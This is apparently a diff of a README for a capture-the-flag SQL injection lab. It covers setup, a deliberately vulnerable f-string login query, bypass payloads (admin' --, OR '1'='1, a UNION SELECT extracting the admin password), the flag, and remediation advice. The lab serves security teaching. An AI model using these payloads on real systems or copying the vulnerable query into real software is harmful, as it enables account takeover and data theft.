@@ -1,54 +1,65 @@
-# SQL Injection Challenge: Authentication Bypass
+SQL Injection Challenge: Authentication Bypass
+Challenge Overview
 
-## Challenge Overview
-This challenge demonstrates a SQL injection vulnerability in the login form of **SecureCorp's employee portal**.  
-Your goal is to bypass authentication and retrieve the **admin password (flag)** from the database.
+This challenge demonstrates a SQL injection vulnerability in the login form of SecureCorp's employee portal.
+Your goal is to bypass authentication and retrieve the admin password (flag) from the database.
 
-This guide provides step-by-step instructions for setting up, running, and exploiting the challenge using either **Docker (recommended)** or a **manual Python setup**.
+This guide provides step-by-step instructions for setting up, running, and exploiting the challenge using either Docker (recommended) or a manual Python setup.
 
----
+Challenge Details
 
-## Challenge Details
-- **Category:** Web Security  
-- **Difficulty:** Easy  
-- **Vulnerability Type:** SQL Injection - Authentication Bypass  
-- **Flag Format:** `RAZZ{sql1_bYP4sS_MAst3r}`  
+Category: Web Security
 
----
+Difficulty: Easy
 
-## Prerequisites
+Vulnerability Type: SQL Injection – Authentication Bypass
+
+Flag Format: RAZZ{sql1_bYP4sS_MAst3r}
+
+Prerequisites
+
 Before starting, ensure you have one of the following setup options available:
 
-### Option A: Docker (Recommended)
-- Docker installed  
-- Basic familiarity with Docker commands  
-- For Linux: sudo privileges or user added to Docker group  
+Option A: Docker (Recommended)
 
-### Option B: Manual Python Setup
-- Python 3.11+  
-- `pip` package manager  
-- Basic familiarity with Python virtual environments  
+Docker installed
 
----
+Basic familiarity with Docker commands
 
-## Step 1: Download/Clone the Challenge
+For Linux: sudo privileges or user added to the Docker group
 
-### 1.1 Open Terminal/Command Prompt
-- **Windows:** Command Prompt, PowerShell, Windows Terminal  
-- **macOS:** Terminal or iTerm2  
-- **Linux:** Terminal, GNOME Terminal, Konsole  
+Option B: Manual Python Setup
 
-### 1.2 Navigate to Desired Directory
+Python 3.11+
 
-### 1.3 Clone the Repository
-```git clone https://github.com/KerberoSec/Razz_Security_Internship_Assignment.git```
+pip package manager
+
+Basic familiarity with Python virtual environments
+
+Step 1: Download/Clone the Challenge
+1.1 Open Terminal/Command Prompt
+
+Windows: Command Prompt, PowerShell, or Windows Terminal
+
+macOS: Terminal or iTerm2
+
+Linux: Terminal, GNOME Terminal, or Konsole
+
+1.2 Navigate to Desired Directory
+cd path/to/your/directory
+
+1.3 Clone the Repository
+git clone https://github.com/KerberoSec/Razz_Security_Internship_Assignment.git
+
 1.4 Navigate to Project Directory
-```cd Razz_Security_Internship_Assignment```
+cd Razz_Security_Internship_Assignment
+
 1.5 Verify Files
-```ls -la```
+ls -la
+
 
 Expected structure:
-```.
+
 ├── app.py
 ├── Dockerfile
 ├── README.md
@@ -57,120 +68,174 @@ Expected structure:
     └── index.html
 
 2 directories, 5 files
-```
+
 Step 2: Docker Setup (Recommended)
 2.1 Build the Docker Image
-# With sudo (if required)
+
+With sudo (if required):
+
 sudo docker build -t sqli-challenge .
 
-# Without sudo
+
+Without sudo:
+
 docker build -t sqli-challenge .
+
 2.2 Run the Docker Container
 sudo docker run -d -p 5000:5000 --name sqli-challenge sqli-challenge
+
 2.3 Verify Container is Running
 sudo docker ps
-Expected:
-```CONTAINER ID   IMAGE            COMMAND          CREATED         STATUS         PORTS                    NAMES
+
+
+Expected output:
+
 abc123def456   sqli-challenge   "python app.py"  5 seconds ago   Up 4 seconds   0.0.0.0:5000->5000/tcp   sqli-challenge
-```
+
 2.4 Access Application
-Open in your browser:
-```http://localhost:5000```
+
+Open in browser:
+
+http://localhost:5000
+
 Step 3: Manual Python Setup (Alternative)
 3.1 Create Virtual Environment
-```python -m venv venv```
-# macOS/Linux
-```source venv/bin/activate```
+python -m venv venv
 
-# Windows
+
+Activate environment:
+
+macOS/Linux:
+
+source venv/bin/activate
+
+
+Windows:
+
 venv\Scripts\activate
+
 3.2 Install Dependencies
-```pip install -r requirements.txt```
+pip install -r requirements.txt
+
 3.3 Run Application
-```python app.py```
+python app.py
+
 3.4 Access Application
-```http://localhost:5000```
+http://localhost:5000
+
 Step 4: Exploitation Guide
 4.1 Vulnerable Code
-```query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"```
-4.2 Identifying Injection
-Navigate to:
-http://localhost:5000
-4.3 Bypass Authentication
-Use payload:
+query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
 
-Username:
-```admin' --```
-Password:
-```anything```
+4.2 Identifying Injection
+
+Navigate to:
+
+http://localhost:5000
+
+4.3 Bypass Authentication
+
+Payload:
+
+Username: admin' --
+
+Password: anything
+
 Resulting query:
-```SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'```
+
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
 
 4.4 Retrieve Flag
-After login as admin, the flag will be displayed:
-```RAZZ{sql1_bYP4sS_MAst3r}```
+
+After logging in as admin, the flag will be displayed:
+
+RAZZ{sql1_bYP4sS_MAst3r}
+
 4.5 Alternative Payloads
+
 Method 1: Always True
+
 Username: admin' OR '1'='1
 Password: anything
+
+
 Method 2: Union Injection
+
 Username: admin' UNION SELECT 1,password,3 FROM users WHERE username='admin' --
 Password: anything
+
 Step 5: Database Schema & Data
 5.1 Schema
-```CREATE TABLE users (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    username TEXT UNIQUE NOT NULL,
-    password TEXT NOT NULL,
-    is_admin INTEGER DEFAULT 0
-);
-```
+id INTEGER PRIMARY KEY AUTOINCREMENT,
+username TEXT UNIQUE NOT NULL,
+password TEXT NOT NULL,
+is_admin INTEGER DEFAULT 0
+
 5.2 Sample Data
-```id	username	password	is_admin
-1	admin	RAZZ{sql1_bYP4sS_MAst3r}	1
-2	john_doe	password123	0
-3	jane_smith	securepass	0
-```
+1   admin       RAZZ{sql1_bYP4sS_MAst3r}   1
+2   john_doe    password123                0
+3   jane_smith  securepass                 0
+
 Step 6: Management Commands
 6.1 Docker
-# List containers
-```sudo docker ps```
 
-# Stop container
-```sudo docker stop sqli-challenge```
+List containers
 
-# Start container
-```sudo docker start sqli-challenge```
+sudo docker ps
 
-# Remove container
-```sudo docker rm sqli-challenge```
 
-# Remove image
-```sudo docker rmi sqli-challenge```
+Stop container
 
-# View logs
-```sudo docker logs sqli-challenge```
+sudo docker stop sqli-challenge
 
-6.2 Python Virtual Env
-# Deactivate
-```deactivate```
 
-# Reactivate
-```source venv/bin/activate   # macOS/Linux
-venv\Scripts\activate      # Windows
-```
-# Reinstall dependencies
-```pip install --force-reinstall -r requirements.txt```
+Start container
+
+sudo docker start sqli-challenge
+
+
+Remove container
+
+sudo docker rm sqli-challenge
+
+
+Remove image
+
+sudo docker rmi sqli-challenge
+
+
+View logs
+
+sudo docker logs sqli-challenge
+
+6.2 Python Virtual Environment
+
+Deactivate
+
+deactivate
+
+
+Reactivate (Windows)
+
+venv\Scripts\activate
+
+
+Reinstall dependencies
+
+pip install --force-reinstall -r requirements.txt
+
 Step 7: Troubleshooting
-Port already in use: Use another port or stop conflicting service.
 
-Docker permission denied: Add user to docker group or use sudo.
+Port already in use: Use another port or stop conflicting service
 
-Module not found: Ensure venv activated and run pip install -r requirements.txt.
+Docker permission denied: Add user to Docker group or use sudo
 
-Database errors: Check file permissions for SQLite DB file.
+Module not found: Ensure venv is activated and run pip install -r requirements.txt
+
+Database errors: Check file permissions for SQLite DB file
 
 Step 8: Learning Objectives
+
 Understand SQL injection in login forms
 
 Exploit authentication bypass
@@ -180,19 +245,23 @@ Learn input validation & parameterized queries
 Recognize security risks of unsanitized SQL queries
 
 Step 9: Security Best Practices
+
 Always use parameterized queries
 
 Validate & sanitize user inputs
 
 Implement proper error handling
 
-Use least privilege DB accounts
+Use least-privilege DB accounts
 
 Regularly update dependencies
 
 Deploy a Web Application Firewall (WAF)
 
 Step 10: Additional Resources
+
 OWASP SQL Injection Prevention Cheat Sheet
+
 PortSwigger SQL Injection Tutorial
+
 Flask Security Guidelines
